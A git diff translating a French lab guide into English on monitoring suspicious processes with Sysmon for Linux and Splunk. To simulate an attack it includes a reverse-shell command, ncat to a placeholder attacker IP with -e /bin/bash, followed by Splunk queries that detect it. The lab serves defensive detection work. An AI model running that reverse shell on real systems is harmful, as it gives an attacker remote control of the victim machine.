@@ -1,10 +1,10 @@
-# Surveillance et enquête sur l'exécution de processus suspects
+# Monitoring and Investigation of Suspicious Process Execution
 
-- L’installation de Sysmon pour Linux avec une configuration XML avancée pour détecter plusieurs techniques MITRE ATT&CK.
+- Installation of **Sysmon for Linux** with an advanced XML configuration to detect multiple MITRE ATT&CK techniques.
 
 - [Sysmon for Linux](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
 
-#### Installation de Sysmon for Linux
+## Installing Sysmon for Linux
 
 ```sh
 wget -q https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
@@ -14,34 +14,34 @@ sudo apt-get update
 sudo apt-get install sysmonforlinux
 ```
 
-## Configuration XML avancée
+## Advanced XML Configuration
 
-#### Créer un fichier de configuration
+#### Create a configuration file
 
 ```sh
 nano sysmon-config.xml
 ```
 
-#### Puis coller le contenu XML suivant (extrait optimisé et indenté proprement) :
+#### Paste the following XML content (clean, indented, and optimized excerpt):
 
-- [Base de configuration recommandée : MSTIC Sysmon Config](https://github.com/microsoft/MSTIC-Sysmon/blob/main/linux/configs/main.xml)
+- [Recommended base config: MSTIC Sysmon Config](https://github.com/microsoft/MSTIC-Sysmon/blob/main/linux/configs/main.xml)
 
-#### Lancer Sysmon avec la configuration
+#### Start Sysmon with the configuration
 
 ```sh
 sysmon -i sysmon-config.xml
 ```
 
-#### Vérifier que Sysmon fonctionne
+#### Verify Sysmon is running
 
 ```sh
 sudo systemctl restart sysmon
 sudo systemctl status sysmon
 ```
 
-## Simuler une attaque - Reverse Shell avec ncat
+## Simulate an Attack – Reverse Shell with ncat
 
-#### Sur la machine d’attaque
+#### On the attack machine:
 
 ```sh
 root@attack:~# apt install ncat net-tools -y
@@ -60,27 +60,29 @@ pwd
 /root
 ```
 
-#### Sur la machine compromise (victime) :
+#### On the compromised (victim) machine:
 
 ```sh
 apt install ncat net-tools -y
 ncat <IP_ATTACK_MACHINE> 4444 -e /bin/bash
 ```
 
-#### Vérification de la connexion :
+#### Verify the connection:
 
 ```sh
 lsof -i :4444
 netstat -tulnp | grep 4444
 ```
 
-## Analyse dans Splunk (Search & Reporting)
+## Analysis in Splunk (Search & Reporting)
 
-> `Requêtes dans Search & Reporting`
+#### Search queries in `Search & Reporting`:
 
-- Affiche tous les logs liés à Sysmon
-- Filtre sur les événements identifiés comme techniques de type Command.
-- Recherche spécifique d’utilisation de ncat.
+- Show all logs related to Sysmon
+
+- Filter on events identified as Command techniques
+
+- Specific search for usage of ncat
 
 ```sh
 index="linux_os_logs" process=sysmon TechniqueName=Command ncat
